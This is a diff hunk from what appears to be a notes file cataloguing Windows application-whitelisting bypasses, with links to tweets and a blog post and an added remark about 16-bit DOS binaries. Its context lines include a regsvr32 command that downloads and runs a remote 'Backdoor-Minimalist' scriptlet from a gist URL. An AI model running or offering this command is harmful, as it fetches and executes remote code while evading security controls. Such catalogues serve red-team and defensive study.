@@ -28,3 +28,6 @@ https://twitter.com/subTee/status/681604454051778561
 # regsvr32
 http://subt0x10.blogspot.com.au/2016/04/bypass-application-whitelisting-script.html
 regsvr32 /s /n /u /i:https://gist.githubusercontent.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302/raw/39138e17a3e382da70ab336cbd29e7c37b16d22b/Backdoor-Minimalist.sct … scrobj.dll https://twitter.com/aionescu/status/723266342829182976
+
+# lol
+does not protect against 16-bit DOS binaries
